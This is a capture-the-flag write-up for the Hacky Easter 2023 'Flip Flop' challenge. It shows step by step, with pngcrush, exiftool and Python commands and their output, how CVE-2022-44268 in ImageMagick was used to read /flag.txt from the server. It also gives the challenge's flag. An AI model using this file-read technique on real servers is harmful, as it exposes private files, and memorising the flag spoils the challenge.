# Description

# Flip Flop

This awesome service can flipflop an image!

Flag is located at: `/flag.txt`

<http://ch.hackyeaster.com:2310>

Note: The service is restarted every hour at x:00.

## Hints

Flipflopped with Imagemagick

# Solution

knowing there exists a imagemagick rce, i googled for `imagemagic cve`

one of the first results was this git repo:

<https://github.com/duc-nt/CVE-2022-44268-ImageMagick-Arbitrary-File-Read-PoC>

this looks like something i want!

so lets test it

i used a png from a earlier challenge

modify the file:

```
$ pngcrush -text a "profile" "/flag.txt" gib_flag.png 
  Recompressing IDAT chunks in gib_flag.png to pngout.png
   Total length of data found in critical chunks            =   2325118
   Best pngcrush method        =   6 (ws 15 fm 6 zl 9 zs 0) =   2359345
CPU time decode 0.797253, encode 3.931847, other 0.300784, total 5.918481 sec
```

check:

```
$ exiv2 -pS pngout.png 
STRUCTURE OF PNG FILE: pngout.png
 address | chunk |  length | data                           | checksum
       8 | IHDR  |      13 | ............                   | 0x6e9bc480
      33 | iCCP  |     385 | sRGB IEC61966-2.1..(.u..+DQ..? | 0x19ea4663
     430 | pHYs  |       9 | .........                      | 0x952b0e1b
     451 | iTXt  |    1367 | XML:com.adobe.xmp.....<?xpacke | 0xd18fe200
    1830 | IDAT  |  524288 | x...w...}'zw....'...f.3.....%R | 0x92cbf4d2
  526130 | IDAT  |  524288 | UHg..g:....8..8....r$......... | 0x37e4b822
 1050430 | IDAT  |  524288 | .@.H9..7_..G.....YX....p..x..8 | 0x4513b237
 1574730 | IDAT  |  524288 | g;.c(S'YHQ..4JC..."......P.YSt | 0x7ea5bdbb
 2099030 | IDAT  |  262088 | ..4...Q..TQE..'z/....WTU{.~..h | 0x205c7739
 2361130 | tEXt  |      17 | profile./flag.txt              | 0x67f4789f
 2361159 | IEND  |       0 |                                | 0xae426082
```

after uploading i got a different file, and i tried to read the flag as described in the repo, but it did not work only gave me this:

```
png:text-encoded profiles: 1 were found
```

but exiftool did the trick!

so i read the data and decoded it from hex:

```
$ exiftool flag.png 
ExifTool Version Number         : 12.57
File Name                       : flag.png
Directory                       : .
File Size                       : 2.3 MB
File Modification Date/Time     : 2023:04:07 13:59:48+02:00
File Access Date/Time           : 2023:04:07 13:59:58+02:00
File Inode Change Date/Time     : 2023:04:07 13:59:58+02:00
File Permissions                : -rw-------
File Type                       : PNG
File Type Extension             : png
MIME Type                       : image/png
Image Width                     : 2732
Image Height                    : 1810
Bit Depth                       : 8
Color Type                      : RGB
Compression                     : Deflate/Inflate
Filter                          : Adaptive
Interlace                       : Noninterlaced
Profile Name                    : icc
Profile CMM Type                : Little CMS
Profile Version                 : 4.3.0
Profile Class                   : Display Device Profile
Color Space Data                : RGB
Profile Connection Space        : XYZ
Profile Date Time               : 2023:01:30 08:11:07
Profile File Signature          : acsp
Primary Platform                : Microsoft Corporation
CMM Flags                       : Not Embedded, Independent
Device Manufacturer             : 
Device Model                    : 
Device Attributes               : Reflective, Glossy, Positive, Color
Rendering Intent                : Perceptual
Connection Space Illuminant     : 0.9642 1 0.82491
Profile Creator                 : Little CMS
Profile ID                      : 0
Profile Description             : sRGB IEC61966-2.1
Profile Copyright               : No copyright, use freely
Media White Point               : 0.9642 1 0.82491
Chromatic Adaptation            : 1.04788 0.02292 -0.05022 0.02959 0.99048 -0.01707 -0.00925 0.01508 0.75168
Red Matrix Column               : 0.43604 0.22249 0.01392
Blue Matrix Column              : 0.14305 0.06061 0.71391
Green Matrix Column             : 0.38512 0.7169 0.09706
Red Tone Reproduction Curve     : (Binary data 32 bytes, use -b option to extract)
Green Tone Reproduction Curve   : (Binary data 32 bytes, use -b option to extract)
Blue Tone Reproduction Curve    : (Binary data 32 bytes, use -b option to extract)
Chromaticity Channels           : 3
Chromaticity Colorant           : Unknown
Chromaticity Channel 1          : 0.64 0.33
Chromaticity Channel 2          : 0.3 0.60001
Chromaticity Channel 3          : 0.14999 0.06
White Point X                   : 0.3127
White Point Y                   : 0.329
Red X                           : 0.64
Red Y                           : 0.33
Green X                         : 0.3
Green Y                         : 0.6
Blue X                          : 0.15
Blue Y                          : 0.06
Background Color                : 255 255 255
Pixels Per Unit X               : 3780
Pixels Per Unit Y               : 3780
Pixel Units                     : meters
Modify Date                     : 2023:04:07 11:59:46
Raw Profile Type Txt            : (Binary data 73 bytes, use -b option to extract)
Warning                         : [minor] Text/EXIF chunk(s) found after PNG IDAT (may be ignored by some readers)
Datecreate                      : 2023-04-07T11:59:46+00:00
Datemodify                      : 2023-04-07T11:59:46+00:00
Icccopyright                    : No copyright, use freely
Iccdescription                  : sRGB IEC61966-2.1
Image Size                      : 2732x1810
Megapixels                      : 4.9



$ exiftool -b flag.png 
Warning: [minor] Text/EXIF chunk(s) found after PNG IDAT (may be ignored by some readers) - flag.png
12.57flag.png.23171672023:04:07 13:59:48+02:002023:04:07 13:59:58+02:002023:04:07 13:59:58+02:00100600PNGPNGimage/png2732181082000icclcms1072mntrRGB XYZ 2023:01:30 08:11:07acspMSFT00 000.9642 1 0.82491lcms0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0sRGB IEC61966-2.1No copyright, use freely0.9642 1 0.824911.04788 0.02292 -0.05022 0.02959 0.99048 -0.01707 -0.00925 0.01508 0.751680.43604 0.22249 0.013920.14305 0.Y�061 0.713910.38512 0.7169 0.09706paraff��
Y�araff��
Y�araff��
[300.64 0.330.3 0.600010.14999 0.060.31270.3290.640.330.30.60.150.06255 255 2553780378012023:04:07 11:59:46
txt
      29
6865323032337b316d3467332d7472346731634b2d6167613131316e7d
[minor] Text/EXIF chunk(s) found after PNG IDAT (may be ignored by some readers)2023-04-07T11:59:46+00:002023-04-07T11:59:46+00:00No copyright, use freelysRGB IEC61966-2.12732 18104.94492

$ python3                                                                                                                                   
Python 3.11.2 (main, Mar 13 2023, 12:18:29) [GCC 12.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> print(bytes.fromhex("6865323032337b316d3467332d7472346731634b2d6167613131316e7d"))
b'he2023{1m4g3-tr4g1cK-aga111n}'
```

# FLAG: he2023{1m4g3-tr4g1cK-aga111n}
